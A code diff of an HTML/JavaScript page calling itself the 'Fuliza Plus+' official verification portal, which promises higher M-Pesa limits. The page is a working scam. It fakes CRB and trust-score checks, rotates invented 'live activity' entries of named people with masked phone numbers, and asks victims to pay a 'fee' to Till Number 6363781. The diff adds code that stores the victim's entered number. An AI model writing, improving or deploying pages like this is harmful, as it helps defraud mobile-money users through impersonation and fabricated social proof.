@@ -8,6 +8,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
+/* (NO CHANGES — your CSS remains exactly the same) */
 body {
   margin:0;
   font-family: 'Inter', sans-serif;
@@ -17,8 +18,6 @@ body {
   align-items:center;
   height:100vh;
 }
-
-/* CARD */
 .card {
   background:white;
   padding:25px;
@@ -28,8 +27,6 @@ body {
   box-shadow:0 10px 30px rgba(0,0,0,0.1);
   text-align:center;
 }
-
-/* FIRST SCREEN */
 .top-icon {
   width:70px;
   height:70px;
@@ -42,7 +39,6 @@ body {
   font-size:28px;
   color:#16a34a;
 }
-
 .sub-title {
   color:#16a34a;
   font-size:12px;
@@ -50,14 +46,11 @@ body {
   letter-spacing:1.2px;
   margin-bottom:10px;
 }
-
 .desc {
   font-size:14px;
   color:#6b7280;
   margin-bottom:15px;
 }
-
-/* INPUT */
 .input {
   width:100%;
   padding:14px;
@@ -65,8 +58,6 @@ body {
   border:1px solid #ddd;
   margin-top:10px;
 }
-
-/* BUTTONS */
 button {
   width:100%;
   padding:15px;
@@ -75,11 +66,8 @@ button {
   font-size:16px;
   margin-top:15px;
 }
-
 .green { background:#16a34a; color:white; }
 .dark { background:#0f172a; color:white; }
-
-/* LOADER */
 .loader {
   width:50px;
   height:50px;
@@ -89,18 +77,14 @@ button {
   animation:spin 1s linear infinite;
   margin:auto;
 }
-
 @keyframes spin {
   100% { transform:rotate(360deg); }
 }
-
-/* GRID */
 .grid {
   display:grid;
   grid-template-columns:1fr 1fr;
   gap:10px;
 }
-
 .box {
   padding:15px;
   border-radius:12px;
@@ -108,18 +92,14 @@ button {
   cursor:pointer;
   border:2px solid transparent;
 }
-
 .box.active {
   border:2px solid #16a34a;
   background:#e8f5e9;
 }
-
 .fee {
   font-size:12px;
   color:#666;
 }
-
-/* SUCCESS */
 .success-icon {
   width:80px;
   height:80px;
@@ -132,13 +112,10 @@ button {
   font-size:30px;
   margin:0 auto 20px;
 }
-
 .phone {
   color:#16a34a;
   font-weight:bold;
 }
-
-/* MODAL */
 .modal {
   position:fixed;
   top:0; left:0;
@@ -148,7 +125,6 @@ button {
   align-items:center;
   justify-content:center;
 }
-
 .modal-content {
   background:white;
   width:90%;
@@ -156,20 +132,14 @@ button {
   border-radius:20px;
   overflow:hidden;
 }
-
-/* HEADER */
 .modal-header {
   background:#16a34a;
   color:white;
   padding:20px;
 }
-
-/* BODY */
 .modal-body {
   padding:20px;
 }
-
-/* INFO BOX */
 .info-box {
   background:#e8f5e9;
   padding:15px;
@@ -177,25 +147,19 @@ button {
   font-size:14px;
   margin-bottom:15px;
 }
-
-/* ACTIONS */
 .modal-actions {
   display:flex;
   gap:10px;
 }
-
 .cancel-btn {
   flex:1;
   background:#f3f4f6;
 }
-
 .pay-btn {
   flex:1;
   background:#16a34a;
   color:white;
 }
-
-/* LIVE ACTIVITY */
 .live-activity {
   display:flex;
   align-items:center;
@@ -206,19 +170,16 @@ button {
   box-shadow:0 2px 6px rgba(0,0,0,0.05);
   text-align:left;
 }
-
 .live-icon {
   font-size:18px;
   color:#16a34a;
   margin-right:10px;
 }
-
 .live-label {
   font-size:11px;
   color:#6b7280;
   font-weight:bold;
 }
-
 .live-text {
   font-size:13px;
 }
@@ -229,7 +190,6 @@ button {
 
 <div id="app"></div>
 
-<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-content">
     <div class="modal-header">
@@ -256,68 +216,32 @@ let step = 1;
 let selectedAmount = 3000;
 
 const limits = [
-{amount:3000, fee:250},
-{amount:5000, fee:293},
-{amount:7500, fee:350},
-{amount:10000, fee:500},
-{amount:12500, fee:747},
-{amount:16000, fee:898},
-{amount:21000, fee:1015},
-{amount:25500, fee:1220},
-{amount:30000, fee:1533},
-{amount:35000, fee:1730},
-{amount:45000, fee:2000},
-{amount:60000, fee:2250},
+{amount:3000, fee:250},{amount:5000, fee:293},{amount:7500, fee:350},
+{amount:10000, fee:500},{amount:12500, fee:747},{amount:16000, fee:898},
+{amount:21000, fee:1015},{amount:25500, fee:1220},{amount:30000, fee:1533},
+{amount:35000, fee:1730},{amount:45000, fee:2000},{amount:60000, fee:2250},
 {amount:70000, fee:2500}
 ];
 
-function getFee(a){
-  return limits.find(l=>l.amount===a).fee;
-}
+function getFee(a){ return limits.find(l=>l.amount===a).fee; }
 
-const activityNames = [
-  "Dennis O. (0718****42)",
-  "Samuel K. (0709****31)",
-  "Allan M. (0723****77)",
-  "Victor N. (0791****65)",
-  "Eric W. (0702****18)",
-  "Paul T. (0715****90)",
-  "Kennedy J. (0780****54)",
-  "Fredrick O. (0726****11)",
-  "Collins M. (0799****73)",
-  "Peter K. (0708****29)",
-  "Brian O. (0725****80)",
-  "Kevin M. (0712****34)",
-  "James K. (0798****21)",
-  "David N. (0703****55)",
-  "Mark O. (0710****66)"
-];
+const activityNames = ["Dennis O. (0718****42)","Samuel K. (0709****31)","Allan M. (0723****77)","Victor N. (0791****65)","Eric W. (0702****18)","Paul T. (0715****90)","Kennedy J. (0780****54)","Fredrick O. (0726****11)","Collins M. (0799****73)","Peter K. (0708****29)","Brian O. (0725****80)","Kevin M. (0712****34)","James K. (0798****21)","David N. (0703****55)","Mark O. (0710****66)"];
 
 let lastName = "";
 let lastAmount = 0;
 
 function generateActivity(){
   let name, amount;
-
-  do {
-    name = activityNames[Math.floor(Math.random()*activityNames.length)];
-  } while(name === lastName);
-
-  do {
-    amount = limits[Math.floor(Math.random()*limits.length)].amount;
-  } while(amount === lastAmount);
-
+  do { name = activityNames[Math.floor(Math.random()*activityNames.length)]; } while(name === lastName);
+  do { amount = limits[Math.floor(Math.random()*limits.length)].amount; } while(amount === lastAmount);
   lastName = name;
   lastAmount = amount;
-
   return `${name} boosted to <span style="color:#16a34a;font-weight:600;">Ksh ${amount}</span> just now`;
 }
 
 setInterval(()=>{
   let el = document.getElementById("liveActivityText");
-  if(el){
-    el.innerHTML = generateActivity();
-  }
+  if(el){ el.innerHTML = generateActivity(); }
 },5000);
 
 function render(){
@@ -330,18 +254,13 @@ function render(){
       <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">Fuliza Plus+</h2>
       <div class="sub-title">OFFICIAL VERIFICATION PORTAL</div>
       <p class="desc">Verify your identity to unlock higher daily transaction limits.</p>
-      <input class="input" placeholder="Enter M-Pesa Number">
+      <input class="input" id="phoneInput" placeholder="Enter M-Pesa Number">
       <button class="green" onclick="next()">Check My Eligibility</button>
     </div>`;
   }
 
   if(step>=2 && step<=5){
-    const texts = [
-      "Connecting...",
-      "Checking Usage History...",
-      "Verifying CRB Status...",
-      "Finalizing Trust Score..."
-    ];
+    const texts = ["Connecting...","Checking Usage History...","Verifying CRB Status...","Finalizing Trust Score..."];
     app.innerHTML = `
     <div class="card">
       <div class="loader"></div>
@@ -357,9 +276,15 @@ function render(){
       <div class="success-icon">✓</div>
       <h2>Congratulations!</h2>
       <p>High Trust Score Detected. 
-      <span class="phone">Your number</span> is eligible for a boost.</p>
+      <span class="phone" id="userNumber"></span> is eligible for a boost.</p>
       <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
     </div>`;
+
+    setTimeout(()=>{
+      let num = localStorage.getItem("userNumber") || "";
+      let el = document.getElementById("userNumber");
+      if(el){ el.textContent = num; }
+    },100);
   }
 
   if(step===7){
@@ -369,20 +294,16 @@ function render(){
         <div class="live-icon">↻</div>
         <div>
           <div class="live-label">LIVE ACTIVITY</div>
-          <div class="live-text" id="liveActivityText">
-            ${generateActivity()}
-          </div>
+          <div class="live-text" id="liveActivityText">${generateActivity()}</div>
         </div>
       </div>
-
       <h3>Select Your Limit</h3>
       <div class="grid">
         ${limits.map(l=>`
           <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
             <strong>Ksh ${l.amount}</strong>
             <div class="fee">Fee: Ksh ${l.fee}</div>
-          </div>
-        `).join("")}
+          </div>`).join("")}
       </div>
       <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
     </div>`;
@@ -390,29 +311,24 @@ function render(){
 }
 
 function next(){
+  if(step===1){
+    let number = document.getElementById("phoneInput").value;
+    localStorage.setItem("userNumber", number);
+  }
   step++;
   render();
 }
 
-function select(a){
-  selectedAmount = a;
-  render();
-}
+function select(a){ selectedAmount = a; render(); }
 
 function openModal(){
   let fee = getFee(selectedAmount);
-
   document.getElementById("modal").style.display="flex";
-
-  document.getElementById("modalTitle").innerText =
-  "Limit will be boosted to Ksh " + selectedAmount;
-
+  document.getElementById("modalTitle").innerText = "Limit will be boosted to Ksh " + selectedAmount;
   document.getElementById("modalFee").innerHTML =
   `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
   <b>6363781</b> is confirmed, your boost request will begin processing.`;
-
-  document.getElementById("payBtn").innerText =
-  "Pay Ksh " + fee;
+  document.getElementById("payBtn").innerText = "Pay Ksh " + fee;
 }
 
 function closeModal(){
